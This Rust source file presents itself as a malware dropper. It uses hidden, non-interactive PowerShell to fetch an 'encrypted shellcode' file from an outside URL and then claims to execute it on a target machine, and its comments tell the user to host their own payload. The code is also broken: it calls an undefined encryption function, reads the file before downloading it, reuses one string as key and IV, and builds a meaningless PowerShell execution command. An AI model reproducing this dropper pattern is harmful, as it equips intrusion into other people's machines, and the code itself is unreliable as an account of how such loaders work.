use std::io::{Read, Write};
use std::fs::File;
use std::process::{Command, Stdio};

// Function to generate AES256 encrypted shellcode
fn generate_encrypted_shellcode() -> Vec<u8> {
// Generate AES256 key and IV (not shown in this example)
let key = "ff827540075736f397c113a5edcb5d93".as_bytes();
let iv = "ff827540075736f397c113a5edcb5d93".as_bytes();

// Encrypt shellcode using AES256
let encrypted_shellcode = encrypt_using_aes(b"shellcode", key, iv);

return encrypted_shellcode;

}

// Function to download and execute the encrypted shellcode on target machine
fn run_encrypted_shellcode() {
let mut encrypted_shellcode = generate_encrypted_shellcode();

// Replace the following URL with your own web-hosted AES256 encrypted shellcode file
let url = "https://attck.pages.dev/attcks/payloads/dropship.bin";

let mut file = File::open("shellcode.bin").expect("Unable to open file");
file.read_to_end(&mut encrypted_shellcode).expect("Error reading from file");

// Download the encrypted shellcode file
let output = Command::new("powershell")
    .arg("-NoP")
    .arg("-NonI")
    .arg("-W Hidden")
    .arg(&format!("Invoke-WebRequest -Uri {} -OutFile shellcode.bin", url))
    .stdout(Stdio::null())
    .stderr(Stdio::null())
    .output()
    .expect("Error executing PowerShell command");

// Check if the download was successful
if output.status.success() {
    // Execute the encrypted shellcode file
    let output = Command::new("powershell")
        .arg("-NoP")
        .arg("-NonI")
        .arg("-W Hidden")
        .arg(&format!("$bytes=[System.Text.Encoding]::UTF8.GetBytes([System.Convert]::FromBase64String(Get-Content shellcode.bin | ForEach-Object { if ($_ -eq $null) {} else { [System.Web.HttpUtility]::UrlEncode($_) }})); [byte[]]($bytes); i = 0; while (i -lt $bytes.Length) {{ $i++ }}"))
        .arg("-ExecuteByPass")
        .arg("-NoExit")
        .arg(&format!("shellcode.bin"))
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .expect("Error executing PowerShell command");
} else {
    println!("Download failed!");
}

}

fn main() {
run_encrypted_shellcode();
}